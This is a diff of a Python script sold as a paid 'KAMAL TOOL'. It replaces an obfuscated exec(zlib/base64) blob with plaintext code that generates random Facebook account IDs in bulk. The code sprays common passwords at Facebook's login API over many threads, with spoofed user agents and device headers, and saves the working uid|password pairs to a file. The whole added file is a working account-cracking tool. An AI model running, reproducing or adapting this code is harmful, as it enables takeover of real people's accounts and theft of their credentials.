@@ -1,2 +1,435 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import os
+import re
+import time
+import uuid
+import hashlib
+import random
+import string
+import requests
+import sys
+import json
+import urllib
+import subprocess
+from bs4 import BeautifulSoup
+from random import randint as rr
+from concurrent.futures import ThreadPoolExecutor as tred
+from os import system
+from datetime import datetime
+
+import os, sys
+
+# Ensure required modules are installed
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
+    try:
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module}')
+
+# Suppress InsecureRequestWarning
+from requests.exceptions import ConnectionError
+from requests import api, models, sessions
+requests.urllib3.disable_warnings()
+
+# ---- Colors (Matched with Orange Theme) ----
+ORANGE = "\033[38;5;208m"
+GREEN = "\033[1;32m"
+CYAN = "\033[1;36m"
+YELLOW = "\033[1;33m"
+RED = "\033[1;31m"
+WHITE = "\033[1;37m"
+MAGENTA = "\033[1;35m"
+BLUE = "\033[1;34m"
+RESET = "\033[0m"
+PINK = "\033[38;5;206m"
+GOLD = "\033[38;5;220m"
+
+# Global variables
+method = []
+oks = []
+cps = []
+loop = 0
+user = []
+CONFIG_FILE = ".raja_approval.txt"
+
+def windows():
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
+    return random.choice([A, B, C, D])
+
+def window1():
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
+    latest_build = rr(6000, 9000)
+    latest_patch = rr(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
+    return random.choice([A, B, C, D])
+
+sys.stdout.write('\x1b]2;KAMAL TOOL \x07')
+
+# --- Main PAID Banner (Orange Theme Matched) ---
+def paid_banner():
+    os.system("cls" if os.name == "nt" else "clear")
+    print(ORANGE + "+======================================================+" + RESET)
+    print(ORANGE)
+    print(r"   ██████╗   █████╗   ██╗ ██████╗ ")
+    print(r"   ██╔══██╗ ██╔══██╗  ██║ ██╔══██╗")
+    print(r"   ██████╔╝ ███████║  ██║ ██║  ██║")
+    print(r"   ██╔═══╝  ██╔══██║  ██║ ██║  ██║")
+    print(r"   ██║      ██║  ██║  ██║ ██████╔╝")
+    print(r"   ╚═╝      ╚═╝  ╚═╝  ╚═╝ ╚═════╝ ")
+    print(RESET)
+    print(ORANGE + "+======================================================+" + RESET)
+    print(GOLD + "            >>  P A I D   T O O L  <<" + RESET)
+    print(YELLOW + "          [*] DEVELOPER : KAMAL VAU [*]" + RESET)
+    print(ORANGE + "+======================================================+" + RESET + "\n")
+    print(PINK + "  [✦] Version 14.0 | VIP USER [✦]" + RESET)
+    print(ORANGE + "-------------------------------------------------------" + RESET)
+    print(WHITE + "  🔰 1 Weeks          : " + GOLD + "2 Dollar$" + RESET)
+    print(WHITE + "  🔰 2 Weeks          : " + GOLD + "4 Dollar$" + RESET)
+    print(WHITE + "  🔰 3 Weeks          : " + GOLD + "15 Dollar$" + RESET)
+    print(WHITE + "  🔥 Offer 1 Month    : " + GREEN + "25 Dollar" + RESET)
+    print(ORANGE + "-------------------------------------------------------" + RESET)
+
+def creationyear(uid):
+    if len(uid) == 15:
+        if uid.startswith(('1000000000', '100000000', '10000000', '1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
+            return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
+            return '2010'
+        if uid.startswith(('100002', '100003')):
+            return '2011'
+        if uid.startswith('100004'):
+            return '2012'
+        if uid.startswith(('100005', '100006')):
+            return '2013'
+        if uid.startswith(('100007', '100008')):
+            return '2014'
+        if uid.startswith('100009'):
+            return '2015'
+        if uid.startswith('10001'):
+            return '2016'
+        if uid.startswith('10002'):
+            return '2017'
+        if uid.startswith('10003'):
+            return '2018'
+        if uid.startswith('10004'):
+            return '2019'
+        if uid.startswith('10005'):
+            return '2020'
+        if uid.startswith('10006'):
+            return '2021'
+        if uid.startswith(('10007', '10008')):
+            return '2022'
+        if uid.startswith('10009'):
+            return '2023'
+        return ''
+    elif len(uid) in (9, 10):
+        return '2008'
+    elif len(uid) == 8:
+        return '2007'
+    elif len(uid) == 7:
+        return '2006'
+    elif len(uid) == 14 and uid.startswith('61'):
+        return '2024'
+    else:
+        return ''
+
+def clear():
+    os.system('clear')
+
+def linex():
+    print(ORANGE + '─────────────────────────────────────────────────────' + RESET)
+
+# --- Approval System ---
+def check_approval():
+    try:
+        uuid_val = str(os.geteuid()) + str(os.getlogin())
+    except:
+        uuid_val = "kamal_device"
+    
+    unique_key = "KAMAL-" + str(abs(hash(uuid_val)) % 1000000)
+
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, "r") as f:
+            saved_key = f.read().strip()
+        if saved_key == unique_key:
+            try:
+                res = requests.get("https://raw.githubusercontent.com/rajavau379-pixel/RajA-VaU-YT/refs/heads/main/key.txt", timeout=5)
+                if unique_key in res.text:
+                    return True
+            except:
+                return True
+
+    paid_banner()
+    print(YELLOW + "  [+] DEVICE APPROVAL PORTAL" + RESET)
+    linex()
+    print(f"{WHITE}  YOUR DEVICE KEY : {ORANGE}{unique_key}{RESET}")
+    print(CYAN + "  (Copy this key and send to admin for approval)")
+    linex()
+    print(YELLOW + "  [⏳] Checking approval from GitHub server..." + RESET)
+    
+    for i in range(5, 0, -1):
+        sys.stdout.write(f"\r  Verifying status... {i}s remaining")
+        sys.stdout.flush()
+        time.sleep(1)
+    print("\n")
+    
+    try:
+        response = requests.get("https://raw.githubusercontent.com/rajavau379-pixel/RajA-VaU-YT/refs/heads/main/key.txt", timeout=5)
+        approved_keys = response.text
+        
+        if unique_key in approved_keys:
+            with open(CONFIG_FILE, "w") as f:
+                f.write(unique_key)
+            print(GREEN + "  [✔] Key Approved Successfully! Access Granted." + RESET)
+            time.sleep(2)
+            return True
+        else:
+            print(RED + "  [X] Key Not Approved or Removed by Admin!" + RESET)
+            if os.path.exists(CONFIG_FILE):
+                os.remove(CONFIG_FILE)
+            input(WHITE + "\n  Press Enter to return to menu..." + RESET)
+            return False
+    except:
+        print(RED + "  [!] Network Connection Error!" + RESET)
+        input(WHITE + "\n  Press Enter to return to menu..." + RESET)
+        return False
+
+def old_clone():
+    paid_banner()
+    print(ORANGE + "  [1] ALL SERIES" + RESET)
+    print(ORANGE + "  [2] 100003/4 SERIES" + RESET)
+    print(ORANGE + "  [3] 2009 SERIES" + RESET)
+    print(RED + "  [0] BACK" + RESET)
+    linex()
+    _input = input(WHITE + "  CHOOSE : " + RESET)
+    if _input in ('1', '01'):
+        old_One()
+    elif _input in ('2', '02'):
+        old_Tow()
+    elif _input in ('3', '03'):
+        old_Tree()
+    elif _input in ('0', '00'):
+        menu()
+    else:
+        print(RED + "  OPTION NOT FOUND IN MENU..." + RESET)
+        time.sleep(1)
+        old_clone()
+
+def old_One():
+    user = []
+    paid_banner()
+    print(ORANGE + "  OLD CODE : 2010-2014" + RESET)
+    ask = input(WHITE + "  SELECT : " + RESET)
+    linex()
+    paid_banner()
+    print(ORANGE + "  EXAMPLE : 20000 / 30000 / 99999" + RESET)
+    limit = input(WHITE + "  SELECT : " + RESET)
+    linex()
+    star = '10000'
+    for _ in range(int(limit)):
+        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
+        user.append(data)
+    paid_banner()
+    print(ORANGE + "  [1] METHOD 1" + RESET)
+    print(ORANGE + "  [2] METHOD 2" + RESET)
+    linex()
+    meth = input(WHITE + "  CHOOSE (1/2): " + RESET).strip()
+    with tred(max_workers=30) as pool:
+        paid_banner()
+        print(f"  TOTAL ID FROM CRACK : {limit}")
+        print("  USE AIRPLANE MOD FOR GOOD RESULT")
+        linex()
+        for mal in user:
+            uid = star + mal
+            if meth in ('1', 'A', 'a'):
+                pool.submit(login_1, uid)
+            elif meth in ('2', 'B', 'b'):
+                pool.submit(login_2, uid)
+            else:
+                break
+
+def old_Tow():
+    user = []
+    paid_banner()
+    print(ORANGE + "  OLD CODE : 2010-2014" + RESET)
+    linex()
+    paid_banner()
+    print(ORANGE + "  EXAMPLE : 20000 / 30000 / 99999" + RESET)
+    limit = input(WHITE + "  TOTAL ID COUNT : " + RESET)
+    linex()
+    prefixes = ['100003', '100004']
+    for _ in range(int(limit)):
+        prefix = random.choice(prefixes)
+        suffix = ''.join(random.choices('0123456789', k=9))
+        uid = prefix + suffix
+        user.append(uid)
+    paid_banner()
+    print(ORANGE + "  [1] METHOD A" + RESET)
+    print(ORANGE + "  [2] METHOD B" + RESET)
+    linex()
+    meth = input(WHITE + "  CHOOSE (1/2): " + RESET).strip()
+    with tred(max_workers=30) as pool:
+        paid_banner()
+        print(f"  TOTAL ID FROM CRACK : {limit}")
+        linex()
+        for uid in user:
+            if meth in ('1', 'A', 'a'):
+                pool.submit(login_1, uid)
+            elif meth in ('2', 'B', 'b'):
+                pool.submit(login_2, uid)
+            else:
+                break
+
+def old_Tree():
+    user = []
+    paid_banner()
+    print(ORANGE + "  OLD CODE : 2009-2010" + RESET)
+    linex()
+    paid_banner()
+    print(ORANGE + "  EXAMPLE : 20000 / 30000 / 99999" + RESET)
+    limit = input(WHITE + "  TOTAL ID COUNT : " + RESET)
+    linex()
+    prefix = '1000004'
+    for _ in range(int(limit)):
+        suffix = ''.join(random.choices('0123456789', k=8))
+        uid = prefix + suffix
+        user.append(uid)
+    paid_banner()
+    print(ORANGE + "  [1] METHOD A" + RESET)
+    print(ORANGE + "  [2] METHOD B" + RESET)
+    linex()
+    meth = input(WHITE + "  CHOOSE (1/2): " + RESET).strip()
+    with tred(max_workers=30) as pool:
+        paid_banner()
+        print(f"  TOTAL ID FROM CRACK : {limit}")
+        linex()
+        for uid in user:
+            if meth in ('1', 'A', 'a'):
+                pool.submit(login_1, uid)
+            elif meth in ('2', 'B', 'b'):
+                pool.submit(login_2, uid)
+            else:
+                break
+
+def login_1(uid):
+    global loop
+    session = requests.session()
+    try:
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;208m+\x1b[1;37m\x1b[38;5;208m(\x1b[1;37mKAMAL OK ID-M1\x1b[38;5;208m)\x1b[1;37m\x1b[38;5;208m(\x1b[38;5;220m{loop}\x1b[38;5;208m)(\x1b[38;5;46m{len(oks)}\x1b[38;5;208m)")
+        sys.stdout.flush()
+        for pw in ('123456', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': window1(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'X-FB-HTTP-Engine': 'Liger'
+            }
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\r{GREEN}[KAMAL-OK] {uid} | {pw}{RESET}")
+                open('/sdcard/KAMAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+        loop += 1
+    except:
+        time.sleep(5)
+
+def login_2(uid):
+    global loop
+    try:
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;208m+\x1b[1;37m(\x1b[1;37mKAMAL -M2\x1b[38;5;208m)(\x1b[38;5;220m{loop}\x1b[38;5;208m)(\x1b[38;5;46m{len(oks)}\x1b[38;5;208m)")
+        sys.stdout.flush()
+        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+            with requests.Session() as session:
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+                po = session.get(url).json()
+                if 'session_key' in str(po):
+                    print(f"\r\r{GREEN}[KAMAL-OK] {uid} | {pw}{RESET}")
+                    open('/sdcard/KAMAL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+        loop += 1
+    except:
+        pass
+
+# --- Main Program Menu ---
+def menu():
+    while True:
+        paid_banner()
+        print(ORANGE + "  [1] Contact admin" + RESET)
+        print(GOLD + "  [2] Check Approval" + RESET)
+        print(RED + "  [3] Exit" + RESET)
+        linex()
+
+        choice = input(WHITE + "  Select Option (1/2/3): " + RESET).strip()
+
+        if choice == "1":
+            whatsapp_link = "https://wa.me/message/GIVJS4M6JWDXD1"
+            print(ORANGE + f"\n  Redirecting to Inbox: {whatsapp_link}" + RESET)
+            try:
+                os.system(f"am start {whatsapp_link} > /dev/null 2>&1")
+            except:
+                pass
+            input(WHITE + "\n  Press Enter to continue..." + RESET)
+        elif choice == "2":
+            if check_approval():
+                old_clone()
+        elif choice == "3":
+            print(RED + "\n  Exiting... Good bye!" + RESET)
+            sys.exit()
+        else:
+            print(RED + "  Invalid choice! Please try again." + RESET)
+            time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        menu()
+    except KeyboardInterrupt:
+        print(RED + "\n\n  Interrupted. Good bye!" + RESET)
+        sys.exit()
